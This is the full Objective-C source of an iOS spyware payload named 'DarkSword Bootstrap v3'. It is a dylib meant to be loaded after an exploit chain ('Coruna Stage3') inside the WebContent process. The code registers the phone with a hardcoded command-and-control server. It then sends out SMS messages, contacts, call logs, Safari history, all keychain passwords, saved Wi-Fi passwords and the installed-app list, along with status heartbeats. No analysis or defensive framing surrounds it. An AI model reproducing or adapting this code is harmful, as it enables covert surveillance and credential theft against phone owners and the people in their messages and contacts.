/**
 * DarkSword Bootstrap v3 - Minimal data collection dylib
 * NO UIKit dependency (not available in WebContent process)
 * Uses only Foundation + CoreFoundation + sqlite3
 * Keeps the same _process entry point as original
 *
 * Compile:
 * clang -framework Foundation -framework CoreFoundation -framework Security \
 *   -framework CFNetwork -lsqlite3 \
 *   -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
 *   -arch arm64 -arch arm64e -miphoneos-version-min=15.0 \
 *   -fobjc-arc -dynamiclib -Oz -Wno-deprecated-declarations \
 *   -o bootstrap.dylib src/main.m
 */

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <sqlite3.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#import <dlfcn.h>

#define C2_HOST "192.168.110.111"
#define C2_PORT 8081

// === HTTP POST using NSURLSession (available in Foundation) ===
static void c2Post(const char *path, NSDictionary *body) {
    @autoreleasepool {
        char url[256];
        snprintf(url, sizeof(url), "http://%s:%d%s", C2_HOST, C2_PORT, path);
        
        NSError *err = nil;
        NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:&err];
        if (!json) return;
        
        NSURL *u = [NSURL URLWithString:@(url)];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:15];
        req.HTTPMethod = @"POST";
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        req.HTTPBody = json;
        
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        [[NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
            dispatch_semaphore_signal(sem);
        }] resume];
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
    }
}

// === SQLite helper ===
static NSMutableArray *queryDB(const char *path, const char *sql) {
    NSMutableArray *results = [NSMutableArray new];
    sqlite3 *db;
    if (sqlite3_open(path, &db) != SQLITE_OK) return results;
    
    sqlite3_stmt *stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        return results;
    }
    
    int cols = sqlite3_column_count(stmt);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        NSMutableDictionary *row = [NSMutableDictionary new];
        for (int i = 0; i < cols; i++) {
            NSString *key = @(sqlite3_column_name(stmt, i));
            switch (sqlite3_column_type(stmt, i)) {
                case SQLITE_INTEGER: row[key] = @(sqlite3_column_int64(stmt, i)); break;
                case SQLITE_FLOAT:   row[key] = @(sqlite3_column_double(stmt, i)); break;
                case SQLITE_TEXT:    row[key] = [NSString stringWithUTF8String:(const char*)sqlite3_column_text(stmt, i)]; break;
                case SQLITE_BLOB:    row[key] = [[NSData dataWithBytes:sqlite3_column_blob(stmt, i) length:sqlite3_column_bytes(stmt, i)] base64EncodedStringWithOptions:0]; break;
                case SQLITE_NULL:    row[key] = [NSNull null]; break;
            }
        }
        [results addObject:row];
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    return results;
}

// === Register device ===
static int registerDevice(void) {
    struct utsname u;
    uname(&u);
    
    NSString *udid = [NSString stringWithFormat:@"native_%@", NSUUID.UUID.UUIDString];
    NSDictionary *body = @{
        @"udid": udid,
        @"deviceName": @(u.machine),
        @"model": @"iPhone",
        @"osVersion": @(u.release),
        @"tagId": @"1"
    };
    
    c2Post("/api/v1/devices/register", body);
    
    // Parse response - need synchronous response
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/api/v1/devices/register", C2_HOST, C2_PORT);
    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:@(url)];
    req.HTTPMethod = @"POST";
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = json;
    
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block int deviceId = 0;
    [[NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        if (d) {
            NSDictionary *res = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
            if ([res[@"code"] intValue] == 0) deviceId = [res[@"data"][@"id"] intValue];
        }
        dispatch_semaphore_signal(sem);
    }] resume];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
    return deviceId;
}

// === Collect SMS ===
static void collectSMS(int did) {
    const char *p = "/var/mobile/Library/SMS/sms.db";
    if (access(p, R_OK) != 0) return;
    
    NSMutableArray *msgs = queryDB(p,
        "SELECT m.text, m.date, m.is_from_me, h.id as handle "
        "FROM message m LEFT JOIN handle h ON m.handle_id=h.ROWID "
        "ORDER BY m.date DESC LIMIT 200");
    
    for (NSDictionary *m in msgs) {
        c2Post("/api/v1/c2/report", @{
            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
            @"data": @{@"platform": @"SMS", @"username": m[@"handle"] ?: @"", @"token": m[@"text"] ?: @"",
                       @"cachedData": [NSString stringWithFormat:@"date:%@,from_me:%@", m[@"date"], m[@"is_from_me"]]}
        });
    }
}

// === Collect Contacts ===
static void collectContacts(int did) {
    const char *p = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    if (access(p, R_OK) != 0) return;
    
    NSMutableArray *contacts = queryDB(p,
        "SELECT p.first,p.last,v.value as phone "
        "FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID=v.record_id "
        "WHERE v.property=3 LIMIT 200");
    
    for (NSDictionary *c in contacts) {
        NSString *name = [NSString stringWithFormat:@"%@ %@", c[@"first"] ?: @"", c[@"last"] ?: @""];
        c2Post("/api/v1/c2/report", @{
            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
            @"data": @{@"platform": @"Contacts", @"username": name, @"token": c[@"phone"] ?: @""}
        });
    }
}

// === Collect Call History ===
static void collectCalls(int did) {
    const char *p = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
    if (access(p, R_OK) != 0) return;
    
    NSMutableArray *calls = queryDB(p,
        "SELECT ZADDRESS,ZDATE,ZDURATION,ZCALLTYPE FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 100");
    
    for (NSDictionary *c in calls) {
        c2Post("/api/v1/c2/report", @{
            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
            @"data": @{@"platform": @"CallHistory", @"username": c[@"ZADDRESS"] ?: @"",
                       @"token": [NSString stringWithFormat:@"dur:%@,type:%@", c[@"ZDURATION"], c[@"ZCALLTYPE"]]}
        });
    }
}

// === Collect Safari History ===
static void collectSafari(int did) {
    const char *p = "/var/mobile/Library/Safari/History.db";
    if (access(p, R_OK) != 0) return;
    
    NSMutableArray *hist = queryDB(p,
        "SELECT url,title FROM history_items ORDER BY visit_time DESC LIMIT 100");
    
    for (NSDictionary *h in hist) {
        c2Post("/api/v1/c2/report", @{
            @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
            @"data": @{@"platform": @"Safari", @"username": h[@"url"] ?: @"", @"token": h[@"title"] ?: @""}
        });
    }
}

// === Collect Keychain ===
static void collectKeychain(int did) {
    NSDictionary *q = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
    };
    
    CFTypeRef result = NULL;
    if (SecItemCopyMatching((__bridge CFDictionaryRef)q, &result) == errSecSuccess && result) {
        NSArray *items = (__bridge_transfer NSArray *)result;
        for (NSDictionary *item in items) {
            NSString *svc = item[(__bridge id)kSecAttrService] ?: @"";
            NSString *acct = item[(__bridge id)kSecAttrAccount] ?: @"";
            NSData *data = item[(__bridge id)kSecValueData];
            NSString *pwd = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"";
            
            if (svc.length > 0 || acct.length > 0) {
                c2Post("/api/v1/c2/report", @{
                    @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
                    @"data": @{@"platform": @"KEYCHAIN", @"username": acct, @"token": pwd ?: @"",
                               @"cachedData": [NSString stringWithFormat:@"svc:%@", svc]}
                });
            }
        }
    }
}

// === Collect WiFi ===
static void collectWiFi(int did) {
    NSString *p = @"/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
    if (!d) return;
    
    for (NSString *ssid in d.allKeys) {
        NSDictionary *net = d[ssid];
        c2Post("/api/v1/c2/report", @{
            @"deviceId": @(did), @"reportType": @"WIFI_PASSWORD",
            @"data": @{@"ssid": ssid, @"password": net[@"Password"] ?: net[@"password"] ?: @"",
                       @"bssid": net[@"BSSID"] ?: @""}
        });
    }
}

// === Collect Installed Apps ===
static void collectApps(int did) {
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:
        @"/var/mobile/Library/Caches/com.apple.mobile.installation.plist"];
    if (!d) return;
    
    NSMutableArray *apps = [NSMutableArray new];
    if (d[@"User"]) [apps addObjectsFromArray:[d[@"User"] allKeys]];
    if (d[@"System"]) [apps addObjectsFromArray:[d[@"System"] allKeys]];
    
    c2Post("/api/v1/c2/report", @{
        @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
        @"data": @{@"platform": @"InstalledApps", @"username": [NSString stringWithFormat:@"%lu apps", apps.count],
                   @"cachedData": [apps componentsJoinedByString:@","]}
    });
}

// === Collect Device Info ===
static void collectDeviceInfo(int did) {
    struct utsname u;
    uname(&u);
    
    c2Post("/api/v1/c2/report", @{
        @"deviceId": @(did), @"reportType": @"SOCIAL_ACCOUNT",
        @"data": @{@"platform": @"DeviceInfo", @"username": [NSString stringWithFormat:@"%s %s", u.machine, u.release],
                   @"cachedData": [NSString stringWithFormat:@"sysname:%s,nodename:%s,machine:%s", u.sysname, u.nodename, u.machine]}
    });
}

// === _process entry point - called by Coruna Stage3 ===
void process(void) {
    @autoreleasepool {
        int did = registerDevice();
        if (did == 0) return;
        
        // Heartbeat
        c2Post("/api/v1/heartbeat/1", @{
            @"udid": [NSString stringWithFormat:@"native_%d", did],
            @"model": @"iPhone", @"osVersion": @"",
            @"agentActive": @YES, @"currentStage": @(5), @"exploitResult": @"native_success"
        });
        
        collectDeviceInfo(did);
        collectSMS(did);
        collectContacts(did);
        collectCalls(did);
        collectSafari(did);
        collectKeychain(did);
        collectWiFi(did);
        collectApps(did);
        
        // Final heartbeat
        c2Post("/api/v1/heartbeat/1", @{
            @"udid": [NSString stringWithFormat:@"native_%d", did],
            @"model": @"iPhone", @"osVersion": @"",
            @"agentActive": @YES, @"currentStage": @(5), @"exploitResult": @"collected"
        });
    }
}
